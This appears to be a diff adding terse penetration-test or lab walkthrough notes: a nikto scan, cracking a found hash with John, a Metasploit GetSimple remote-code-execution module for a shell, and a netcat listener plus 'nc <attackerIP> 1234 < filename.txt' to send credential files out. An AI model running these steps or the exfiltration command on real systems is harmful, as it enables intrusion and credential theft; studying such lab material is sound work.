@@ -1,3 +1,16 @@
 Run a nikto scan against the website
 #nikto -h 10.50.X.X:8080
 see img1
+notice it has data user as interesting
+exit root and open firefox 
+url bar go to to the server/data
+find hash
+crack it with john
+
+open msf console search getsimple
+use remote code exec
+gets you a meterpreter shell
+switch to shell
+exil creds for cracking
+***nc -lvnp 1234** on attacker
+nc <attackerIP> 1234 < filename.txt
